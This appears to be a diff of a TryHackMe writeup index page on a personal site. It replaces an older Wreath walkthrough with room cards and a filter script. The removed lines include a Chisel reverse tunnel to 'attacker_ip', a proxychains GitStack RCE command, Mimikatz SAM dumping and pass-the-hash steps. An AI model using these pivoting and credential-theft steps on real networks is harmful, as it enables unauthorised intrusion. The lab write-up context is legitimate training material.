@@ -1,58 +1,180 @@
 ---
 layout: page
-title: TryHackMe Walkthroughs
-subtitle: Guided rooms and cybersecurity pathways
+title: TryHackMe
+subtitle: Rooms, paths and standalone attack writeups
 permalink: /ctf/platforms/tryhackme/
 ---
 
-## TryHackMe Walkthroughs
+<div class="platform-hero thm-hero">
+  <div class="plat-hero-icon">🏫</div>
+  <div class="plat-hero-text">
+    <h2>TryHackMe</h2>
+    <p>Guided learning rooms, red team attack paths, advanced standalone rooms, and SOC analyst training.</p>
+    <div class="plat-hero-badges">
+      <span class="badge badge-success">Rank: Top 1%</span>
+      <span class="badge badge-info">120+ Rooms</span>
+      <span class="badge badge-warning">15+ Badges</span>
+    </div>
+  </div>
+</div>
 
-Structured writeups for learning paths and complex rooms on TryHackMe, focused on step-by-step methodologies and conceptual learning.
+<div class="machine-filter-bar">
+  <button class="mf-btn active" data-filter="all">All</button>
+  <button class="mf-btn" data-filter="easy">Easy</button>
+  <button class="mf-btn" data-filter="medium">Medium</button>
+  <button class="mf-btn" data-filter="hard">Hard</button>
+  <button class="mf-btn" data-filter="redteam">🔴 Red Team</button>
+  <button class="mf-btn" data-filter="web">🌐 Web</button>
+  <button class="mf-btn" data-filter="ad">🏢 Active Directory</button>
+  <button class="mf-btn" data-filter="forensics">🔬 Forensics</button>
+  <button class="mf-btn" data-filter="osint">🕵️ OSINT</button>
+</div>
 
-### Room 1: Wreath (Hard) - Network Pivoting & Evasion
+---
 
-**Objective**: Exploit a 3-host network starting from an external web server, pivoting through an internal Windows machine, and compromising the internal Domain Controller.
+## 🔴 Red Team Path Rooms
 
-#### Step 1: Initial Access (Wreath Web Server)
-We perform a network scan on the target public IP:
+<div class="machines-list">
 
-```bash
-nmap -sV -sC -p- -T4 -oN external.nmap 10.200.x.x
-```
+  <div class="machine-card" data-os="redteam" data-diff="medium">
+    <div class="mc-left"><span class="mc-os redteam">🔴</span><div><h4 class="mc-name">Red Team Fundamentals</h4><span class="mc-ip">Path — Room 1</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Red team structure · threat intelligence · OPSEC · C2 fundamentals</span></div>
+    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#rtf" class="mc-btn">Notes ↓</a></div>
+  </div>
 
-We discover a running service: MiniServ 1.890 (Webmin) which is vulnerable to unauthenticated remote code execution (CVE-2019-15107).
-We configure the exploit and run it to get a root shell:
+  <div class="machine-card" data-os="redteam" data-diff="medium">
+    <div class="mc-left"><span class="mc-os redteam">🔴</span><div><h4 class="mc-name">Red Team Engagements</h4><span class="mc-ip">Path — Room 2</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Scoping, rules of engagement, mission planning, reporting templates</span></div>
+    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#rte" class="mc-btn">Notes ↓</a></div>
+  </div>
 
-```python
-# CVE-2019-15107 POC execution
-import requests
-# Payload injection in password change parameter
-```
+  <div class="machine-card" data-os="redteam" data-diff="hard">
+    <div class="mc-left"><span class="mc-os redteam">🔴</span><div><h4 class="mc-name">Compromising Active Directory</h4><span class="mc-ip">Standalone</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Kerberoasting · AS-REP · LDAP enum · BloodHound · lateral movement</span></div>
+    <div class="mc-right"><span class="mc-diff hard">Hard</span><a href="#comp-ad" class="mc-btn">Notes ↓</a></div>
+  </div>
 
-#### Step 2: Pivoting to Host 2 (Windows Production Server)
-Once inside the Webmin container, we notice an internal subnet `10.200.x.0/24`. We upload a static `nmap` binary and find a Windows Server on `10.200.x.150` with port 3389 (RDP) and 80 (HTTP) open.
+  <div class="machine-card" data-os="redteam" data-diff="hard">
+    <div class="mc-left"><span class="mc-os redteam">🔴</span><div><h4 class="mc-name">Holo Network</h4><span class="mc-ip">Network Lab</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Full red team op: initial access → C2 → pivoting → AD domain takeover</span></div>
+    <div class="mc-right"><span class="mc-diff hard">Hard</span><a href="#holo" class="mc-btn">Notes ↓</a></div>
+  </div>
 
-We set up pivoting using **Chisel**:
-*   On attacker machine: `chisel server -p 8000 --reverse`
-*   On compromised Webmin server: `./chisel client attacker_ip:8000 R:1080:socks`
+  <div class="machine-card" data-os="redteam" data-diff="hard">
+    <div class="mc-left"><span class="mc-os redteam">🔴</span><div><h4 class="mc-name">Throwback Network</h4><span class="mc-ip">Network Lab</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Multi-host corporate simulation · phishing → internal pivot → exfil</span></div>
+    <div class="mc-right"><span class="mc-diff hard">Hard</span><a href="#throwback" class="mc-btn">Notes ↓</a></div>
+  </div>
 
-Now we proxy our tools through proxychains configured for SOCKS5 on port 1080.
-Scanning port 80 on the Windows machine reveals GitStack. GitStack 2.3.10 is vulnerable to unauthenticated remote code execution via parameter injection in `git-user` page.
+</div>
 
-We execute the exploit through proxychains:
+---
 
-```bash
-proxychains python3 gitstack_rce.py -t 10.200.x.150 -c "whoami"
-```
-We get NT AUTHORITY\SYSTEM.
+## 🌐 Web Hacking Rooms
 
-#### Step 3: Extracting Credentials & Pivoting to Domain Controller
-We dump local SAM hashes using Mimikatz:
+<div class="machines-list">
 
-```text
-mimikatz # lsadump::sam
-```
+  <div class="machine-card" data-os="web" data-diff="easy">
+    <div class="mc-left"><span class="mc-os web">🌐</span><div><h4 class="mc-name">OWASP Top 10 (2021)</h4><span class="mc-ip">Free</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">All 10 categories with hands-on labs — Broken Access, SSRF, SSTI, etc.</span></div>
+    <div class="mc-right"><span class="mc-diff easy">Easy</span><a href="#owasp10" class="mc-btn">Notes ↓</a></div>
+  </div>
 
-We find the password hash of the local administrator. We use this to connect to the internal Domain Controller `10.200.x.200` via WinRM or SMB using Pass-the-Hash.
+  <div class="machine-card" data-os="web" data-diff="medium">
+    <div class="mc-left"><span class="mc-os web">🌐</span><div><h4 class="mc-name">SQL Injection Lab</h4><span class="mc-ip">Standalone</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Union-based · blind boolean · time-based · SQLMap usage</span></div>
+    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#sqli-lab" class="mc-btn">Notes ↓</a></div>
+  </div>
 
-We establish the second pivot using Chisel on the second host, routing traffic deeper into the target environment. This multi-hop pivot setup demonstrates the complexity of pivoting inside modern enterprise corporate networks.
+  <div class="machine-card" data-os="web" data-diff="medium">
+    <div class="mc-left"><span class="mc-os web">🌐</span><div><h4 class="mc-name">Advent of Cyber (Web)</h4><span class="mc-ip">Annual</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">XSS · RCE via file upload · JWT manipulation · IDOR · SSRF</span></div>
+    <div class="mc-right"><span class="mc-diff easy">Easy</span><a href="#aoc-web" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+  <div class="machine-card" data-os="web" data-diff="hard">
+    <div class="mc-left"><span class="mc-os web">🌐</span><div><h4 class="mc-name">Attacking ICS Plant</h4><span class="mc-ip">Industrial</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">SCADA web panel exploitation · Modbus protocol abuse · HMI takeover</span></div>
+    <div class="mc-right"><span class="mc-diff hard">Hard</span><a href="#ics" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+</div>
+
+---
+
+## 🏢 Active Directory Rooms
+
+<div class="machines-list">
+
+  <div class="machine-card" data-os="ad" data-diff="medium">
+    <div class="mc-left"><span class="mc-os ad">🏢</span><div><h4 class="mc-name">Active Directory Basics</h4><span class="mc-ip">Free</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">LDAP structure · users/groups/GPOs · authentication flows · trusts</span></div>
+    <div class="mc-right"><span class="mc-diff easy">Easy</span><a href="#ad-basics" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+  <div class="machine-card" data-os="ad" data-diff="medium">
+    <div class="mc-left"><span class="mc-os ad">🏢</span><div><h4 class="mc-name">Attacktive Directory</h4><span class="mc-ip">10.10.x.x</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">AS-REP Roasting → Kerberoasting → Secretsdump → pass-the-hash</span></div>
+    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#attacktive" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+  <div class="machine-card" data-os="ad" data-diff="hard">
+    <div class="mc-left"><span class="mc-os ad">🏢</span><div><h4 class="mc-name">Post-Exploitation Basics</h4><span class="mc-ip">Path</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">BloodHound · token impersonation · Golden/Silver tickets · persistence</span></div>
+    <div class="mc-right"><span class="mc-diff hard">Hard</span><a href="#postexploit-ad" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+</div>
+
+---
+
+## 🔬 Forensics & OSINT Rooms
+
+<div class="machines-list">
+
+  <div class="machine-card" data-os="forensics" data-diff="medium">
+    <div class="mc-left"><span class="mc-os dfir">🔬</span><div><h4 class="mc-name">Volatility</h4><span class="mc-ip">Memory</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Memory forensics with Volatility 3 — processes, network, credentials</span></div>
+    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#volatility" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+  <div class="machine-card" data-os="forensics" data-diff="medium">
+    <div class="mc-left"><span class="mc-os dfir">🔬</span><div><h4 class="mc-name">Autopsy</h4><span class="mc-ip">Disk</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Disk image analysis · deleted file recovery · timeline analysis · artifact carving</span></div>
+    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#autopsy" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+  <div class="machine-card" data-os="osint" data-diff="easy">
+    <div class="mc-left"><span class="mc-os osint">🕵️</span><div><h4 class="mc-name">OhSINT</h4><span class="mc-ip">OSINT</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Image EXIF metadata → GPS coords → social media → email → password</span></div>
+    <div class="mc-right"><span class="mc-diff easy">Easy</span><a href="#ohsint" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+  <div class="machine-card" data-os="osint" data-diff="medium">
+    <div class="mc-left"><span class="mc-os osint">🕵️</span><div><h4 class="mc-name">Searchlight OSINT</h4><span class="mc-ip">OSINT</span></div></div>
+    <div class="mc-mid"><span class="mc-tech">Advanced OSINT: domain footprinting · social graph analysis · geolocation</span></div>
+    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#searchlight" class="mc-btn">Notes ↓</a></div>
+  </div>
+
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const filterBtns = document.querySelectorAll('.mf-btn');
+  const machineCards = document.querySelectorAll('.machine-card');
+  filterBtns.forEach(btn => {
+    btn.addEventListener('click', function() {
+      const filter = this.dataset.filter;
+      filterBtns.forEach(b => b.classList.remove('active'));
+      this.classList.add('active');
+      machineCards.forEach(card => {
+        if (filter === 'all' || card.dataset.os === filter || card.dataset.diff === filter) {
+          card.style.display = 'flex';
+        } else {
+          card.style.display = 'none';
+        }
+      });
+    });
+  });
+});
+</script>
